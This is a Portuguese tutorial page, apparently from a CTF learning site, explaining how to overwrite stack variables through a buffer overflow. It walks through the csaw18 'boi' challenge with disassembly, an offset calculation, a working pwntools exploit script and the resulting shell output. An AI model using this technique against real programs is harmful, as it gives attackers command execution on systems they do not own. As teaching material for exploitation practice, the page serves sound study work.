---
title: "Buffer Overflow - Variáveis"
sidebar_position: 1
---

Como vimos, podemos sobrescrever variáveis com buffer overflow. Mas como podemos fazer isso?

1. Verifique informações do arquivo com `file arquivo`
2. Abra o programa no Ghidra ou Debugger
3. Verifique se a variável que queremos sobrescrever está **entre a variável do input e o `rbp` na stack**
4. Se estiver, podemos sobrescrever. **Calcule a distância para chegar no início da variável desejada, e sobrescreva com caracteres quaisquer**.
   1. Basicamente, teremos nosso input como `rbp-0x10`, por exemplo, e a outra variável em `rbp-0x5`. Isso quer dizer que a distância entre eles é `0x10 - 0x5 = 0xb = 11`. Ou seja, para chegarmos no **início** de `rbp-0x5`, precisamos sobrescrever a stack com 11 bytes quaisquer.
   2. Geralmente, usamos caracteres, pois cada caractere = 1 byte e fica fácil de contabilizar.
5. Ao final da string, **coloque o que você deseja que seja sobrescrito na variável**.

**Atenção**: Você precisa respeitar a quantidade de espaço de cada variável. Se a variável possui 4 bytes e você sobrescrever apenas 3, um byte será lixo de memória, e vai interferir no valor da variável.

**Curiosidade**: Às vezes você não possui um excedente necessário para fazer Buffer Overflow. Mas, em alguns casos, você pode usar BOF para **modificar a format string** que define o limite de leitura do input. Isso só é possível se a format string estiver na stack (na maioria dos casos ela está em uma região de dados separada, onde há apenas dados constantes, que não são variáveis).

Abaixo, temos alguns binários que ficam para você como lição de casa. Tente resolvê-los e veja o solve caso tenha dificuldade. Os arquivos estão [aqui](https://github.com/guyinatuxedo/nightmare/tree/master/modules/04-bof_variable), no repositório do Nightmare.

## [CHALL] csaw18_boi

Antes, vamos ver algumas informações sobre o arquivo:

```
$ file boi

boi: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=1537584f3b2381e1b575a67cba5fbb87878f9711, not stripped
```

Veja que temos um arquivo em `x86`. Isso quer dizer que

Vejamos a main de um programa abaixo:

```
0x0000000000400641 <+0>:     push   rbp
   0x0000000000400642 <+1>:     mov    rbp,rsp
   0x0000000000400645 <+4>:     sub    rsp,0x40
   0x0000000000400649 <+8>:     mov    DWORD PTR [rbp-0x34],edi
   0x000000000040064c <+11>:    mov    QWORD PTR [rbp-0x40],rsi
   0x0000000000400650 <+15>:    mov    rax,QWORD PTR fs:0x28
   0x0000000000400659 <+24>:    mov    QWORD PTR [rbp-0x8],rax
   0x000000000040065d <+28>:    xor    eax,eax
   0x000000000040065f <+30>:    mov    QWORD PTR [rbp-0x30],0x0
   0x0000000000400667 <+38>:    mov    QWORD PTR [rbp-0x28],0x0
   0x000000000040066f <+46>:    mov    QWORD PTR [rbp-0x20],0x0
   0x0000000000400677 <+54>:    mov    DWORD PTR [rbp-0x18],0x0
   0x000000000040067e <+61>:    mov    DWORD PTR [rbp-0x1c],0xdeadbeef
   0x0000000000400685 <+68>:    mov    edi,0x400764
   0x000000000040068a <+73>:    call   0x4004d0 <puts@plt>
   0x000000000040068f <+78>:    lea    rax,[rbp-0x30]
   0x0000000000400693 <+82>:    mov    edx,0x18
   0x0000000000400698 <+87>:    mov    rsi,rax
   0x000000000040069b <+90>:    mov    edi,0x0
   0x00000000004006a0 <+95>:    call   0x400500 <read@plt>
   0x00000000004006a5 <+100>:   mov    eax,DWORD PTR [rbp-0x1c]
   0x00000000004006a8 <+103>:   cmp    eax,0xcaf3baee
   0x00000000004006ad <+108>:   jne    0x4006bb <main+122>
   0x00000000004006af <+110>:   mov    edi,0x40077c
   0x00000000004006b4 <+115>:   call   0x400626 <run_cmd>
   0x00000000004006b9 <+120>:   jmp    0x4006c5 <main+132>
   0x00000000004006bb <+122>:   mov    edi,0x400786
   0x00000000004006c0 <+127>:   call   0x400626 <run_cmd>
   0x00000000004006c5 <+132>:   mov    eax,0x0
   0x00000000004006ca <+137>:   mov    rcx,QWORD PTR [rbp-0x8]
   0x00000000004006ce <+141>:   xor    rcx,QWORD PTR fs:0x28
   0x00000000004006d7 <+150>:   je     0x4006de <main+157>
   0x00000000004006d9 <+152>:   call   0x4004e0 <__stack_chk_fail@plt>
   0x00000000004006de <+157>:   leave
   0x00000000004006df <+158>:   ret
```

Podemos ver que o programa verifica se a variável `rbp-0x1c` é igual a `0xcaf3baee` (sim, é um número inteiro expresso em hexadecimal), ou seja, um IF:

```
   0x00000000004006a5 <+100>:   mov    eax,DWORD PTR [rbp-0x1c]
   0x00000000004006a8 <+103>:   cmp    eax,0xcaf3baee
```

Se esta condição for verdadeira, isso irá abrir uma shell, ou seja, o `run_cmd` nos permite executar comandos (se tivermos acesso a isso, obtemos acesso completo ao servidor onde o arquivo roda).

Se verificarmos, a variável `rbp-0x1c` é inicializada antes com `0xdeadbeef`:

```
   0x000000000040067e <+61>:    mov    DWORD PTR [rbp-0x1c],0xdeadbeef
```

Porém, o problema é que a variável passada para o `read`, que lê o input e atribui a uma variável, é outra completamente diferente:

```
   0x000000000040068f <+78>:    lea    rax,[rbp-0x30]
   0x0000000000400693 <+82>:    mov    edx,0x18
   0x0000000000400698 <+87>:    mov    rsi,rax
   0x000000000040069b <+90>:    mov    edi,0x0
   0x00000000004006a0 <+95>:    call   0x400500 <read@plt>
```

Vemos que a variável passada como parâmetro é `rbp-0x30` (os registradores `rsi`, `rdi` são usados para passar argumentos para funções). Ou seja, esse é o input no qual colocamos uma string.

A função `read` não possui limite de leitura, então podemos fazer um Buffer Overflow.

Temos o input `rbp-0x30` e a variável que queremos sobrescrever em `rbp-0x1c`. Como `0x1c < 0x30`, a variável desejada está entre nosso input e o `rbp`, portanto podemos sobrescrever.

A distância entre o input e a variável é `0x30-0x1c = 0x14 = 20`. Portanto, precisamos encher 20 casas com caracteres e depois colocar o que queremos. Vamos fazer isso com pwntools, em python: 

```py
# Importa pwntools
from pwn import *

# Estabelece o processo alvo
target = process('./boi')

# Faz o payload
# 0x14 bytes de dados quaisquer para encher o espaço entre
# o início de nosso input e o início da variável alvo (inteiro)
# 0x4 byte int we will overwrite target with
payload = b"0"*0x14 + p32(0xcaf3baee)

# Send the payload
target.send(payload)

# Drop to an interactive shell so we can interact with our shell
target.interactive()
```

Um ponto importante é que, como o arquivo está em `x86`, precisamos empacotar o valor `0xcaf3baee` para ocupar 4 bytes, além de deixar em little endian. A função `p32()` faz isto para nós.

Quando rodamos o script...

```
$ python3 exploit.py
[+] Starting local process './boi': pid 4700
[*] Switching to interactive mode
Are you a big boiiiii??
$ hey
/bin/bash: line 1: hey: command not found
$ ls
boi  exploit.py  input  Readme.md
```

Sobrescrever a variável validou a condição que estava sendo verificada. Isto abriu para nós uma shell! (podemos digitar comandos e navegar pelo servidor onde o arquivo está sendo executado)

Chall completo :)
